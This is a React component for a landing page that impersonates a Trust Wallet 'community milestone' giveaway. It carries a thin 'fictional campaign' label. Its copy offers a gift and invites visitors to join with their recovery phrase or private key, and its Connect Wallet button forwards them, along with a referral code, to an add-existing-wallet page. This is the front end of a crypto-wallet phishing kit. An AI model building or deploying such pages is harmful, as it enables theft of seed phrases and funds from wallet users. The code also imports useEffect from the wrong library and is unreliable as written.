// LandingPage.jsx
import { IoChevronDown } from 'react-icons/io5'
import { useNavigate, useLocation, useEffect } from 'react-router-dom'
import trustShield from '../../assets/trust-shield.png'

function LandingPage() {
  const navigate = useNavigate()
  const location = useLocation()
  
  // Capture and display referral on landing page
  useEffect(() => {
    const params = new URLSearchParams(location.search)
    const ref = params.get('ref')
    if (ref) {
      console.log('📢 Referral detected on landing:', ref)
      // Optionally show a welcome banner
    }
  }, [location])

  const handleConnectWallet = () => {
    // Preserve referral when navigating
    const params = new URLSearchParams(location.search)
    const ref = params.get('ref')
    const path = ref ? `/add-existing-wallet?ref=${ref}` : '/add-existing-wallet'
    navigate(path)
  }

  return (
    <main className="landing-page">
      <div className="landing-stage" aria-label="Fictional Trust Wallet community campaign">
        <span className="landing-cursor landing-cursor-top" aria-hidden="true" />
        <span className="landing-cursor landing-cursor-side" aria-hidden="true" />

        <div className="landing-orbit" aria-hidden="true">
          <span className="landing-orbit-ring" />
          <img
            className="landing-shield landing-shield-primary"
            src={trustShield}
            alt=""
          />
        </div>
        <img
          className="landing-shield landing-shield-small"
          src={trustShield}
          alt=""
        />
        <img
          className="landing-shield landing-shield-tiny"
          src={trustShield}
          alt=""
        />

        <section className="landing-copy">
          <p>Fictional campaign concept.</p>
          <h1>Trust Wallet Community Milestone</h1>
          <span>
            A 220 million user appreciation moment focused on long-term community
            recognition, wallet security, and responsible Web3 participation.
          </span>
          <ul className="landing-points" aria-label="Campaign highlights">
            <li>Celebrate global community growth</li>
            <li>Claim Your own gift</li>
            <li>join with your recovery phrase or private key</li>
          </ul>
          <button type="button" onClick={handleConnectWallet}>
            Connect Wallet
          </button>
        </section>

        <div className="landing-next" aria-hidden="true">
          <IoChevronDown />
        </div>
      </div>
    </main>
  )
}

export default LandingPage